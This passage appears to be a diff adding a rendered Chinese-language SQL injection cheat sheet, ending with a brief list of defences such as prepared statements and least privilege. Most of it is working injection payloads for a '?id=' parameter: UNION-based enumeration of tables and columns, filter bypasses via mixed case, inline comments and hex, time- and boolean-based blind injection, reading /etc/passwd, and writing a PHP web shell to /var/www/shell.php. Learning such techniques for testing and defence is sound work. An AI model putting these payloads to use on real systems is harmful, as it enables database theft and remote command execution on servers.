+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">4</span><span class="c1">--+  -- 如果报错，说明只有3列</span>
+</code></pre></div>
+<h3 id="22-union-select">2.2 UNION SELECT<a class="headerlink" href="#22-union-select" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1">-- 获取数据库信息</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,3--+</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="k">version</span><span class="p">()</span><span class="c1">--+</span>
+</code></pre></div>
+<h3 id="23-group_concat">2.3 GROUP_CONCAT<a class="headerlink" href="#23-group_concat" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1">-- 获取所有表名</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="s1">-- 获取所有列名</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">),</span><span class="mi">3</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="c1">--+</span>
+</code></pre></div>
+<h2 id="3">3. 常用函数<a class="headerlink" href="#3" title="Permanent link">&para;</a></h2>
+<h3 id="31">3.1 版本信息<a class="headerlink" href="#31" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1">-- 获取版本信息</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and @@version like &#39;</span><span class="mi">5</span><span class="o">%</span><span class="s1">&#39;--+</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">version</span><span class="p">()</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;5%&#39;</span><span class="c1">--+</span>
+</code></pre></div>
+<h3 id="32">3.2 数据库信息<a class="headerlink" href="#32" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1">-- 获取当前数据库</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and database()=&#39;</span><span class="k">security</span><span class="s1">&#39;--+</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="o">@@</span><span class="n">datadir</span><span class="o">=</span><span class="s1">&#39;/var/lib/mysql/&#39;</span><span class="c1">--+</span>
+</code></pre></div>
+<h3 id="33">3.3 用户信息<a class="headerlink" href="#33" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1">-- 获取当前用户</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and user()=&#39;</span><span class="n">root</span><span class="o">@</span><span class="n">localhost</span><span class="s1">&#39;--+</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="o">@@</span><span class="n">hostname</span><span class="o">=</span><span class="s1">&#39;webserver&#39;</span><span class="c1">--+</span>
+</code></pre></div>
+<h2 id="4">4. 绕过过滤技巧<a class="headerlink" href="#4" title="Permanent link">&para;</a></h2>
+<h3 id="41">4.1 大小写混合<a class="headerlink" href="#41" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1">-- 绕过大小写过滤</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; UniOn SeLeCt 1,2,3--+</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">sElEcT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FrOm</span><span class="w"> </span><span class="n">users</span><span class="c1">--+</span>
+</code></pre></div>
+<h3 id="42">4.2 内联注释<a class="headerlink" href="#42" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1">-- 使用内联注释绕过</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; /*!UNION*/ SELECT 1,2,3--+</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="cm">/*!50000UNION*/</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="c1">--+</span>
+</code></pre></div>
+<h3 id="43">4.3 十六进制编码<a class="headerlink" href="#43" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1">-- 使用十六进制绕过</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,0x61646d696e,3--+</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="mi">0</span><span class="n">x61646d696e</span><span class="c1">--+</span>
+</code></pre></div>
+<h2 id="5">5. 盲注关键词<a class="headerlink" href="#5" title="Permanent link">&para;</a></h2>
+<h3 id="51">5.1 时间盲注<a class="headerlink" href="#51" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1">-- 基于时间的盲注</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(1=1,sleep(5),0)--+</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">100</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span><span class="c1">--+</span>
+</code></pre></div>
+<h3 id="52">5.2 布尔盲注<a class="headerlink" href="#52" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1">-- 基于布尔的盲注</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and length(database())=8--+</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">100</span><span class="c1">--+</span>
+</code></pre></div>
+<h2 id="6">6. 文件操作关键词<a class="headerlink" href="#6" title="Permanent link">&para;</a></h2>
+<h3 id="61">6.1 读取文件<a class="headerlink" href="#61" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1">-- 读取系统文件</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,load_file(&#39;</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="s1">&#39;),3--+</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">load_file</span><span class="p">(</span><span class="mi">0</span><span class="n">x2f6574632f706173737764</span><span class="p">),</span><span class="mi">3</span><span class="c1">--+</span>
+</code></pre></div>
+<h3 id="62">6.2 写入文件<a class="headerlink" href="#62" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1">-- 写入Webshell</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,&#39;</span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="k">system</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="n">cmd</span><span class="p">]);</span><span class="o">?&gt;</span><span class="s1">&#39;,3 into outfile &#39;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="s1">&#39;--+</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="n">x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e</span><span class="p">,</span><span class="mi">3</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;/var/www/shell.php&#39;</span><span class="c1">--+</span>
+</code></pre></div>
+<h2 id="7">7. 防御建议<a class="headerlink" href="#7" title="Permanent link">&para;</a></h2>
+<ol>
+<li>
+<p>使用预处理语句
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="x">$stmt = $conn-&gt;prepare(&quot;SELECT * FROM users WHERE id = ?&quot;);</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="x">$stmt-&gt;bind_param(&quot;i&quot;, $id);</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="x">$stmt-&gt;execute();</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>输入验证和过滤
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="x">if (!is_numeric($id)) {</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="x">    die(&quot;Invalid input&quot;);</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="x">}</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>最小化数据库权限
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="k">GRANT</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="k">database</span><span class="p">.</span><span class="o">*</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="s1">&#39;webuser&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>错误信息处理
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="x">error_reporting(0);</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="x">ini_set(&#39;display_errors&#39;, 0);</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>使用WAF规则
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="k">location</span><span class="w"> </span><span class="s">/</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="w">    </span><span class="kn">ModSecurityEnabled</span><span class="w"> </span><span class="no">on</span><span class="p">;</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="w">    </span><span class="kn">ModSecurityConfig</span><span class="w"> </span><span class="s">modsecurity.conf</span><span class="p">;</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="p">}</span>
+</code></pre></div></p>
+</li>
+</ol>
 
 
 
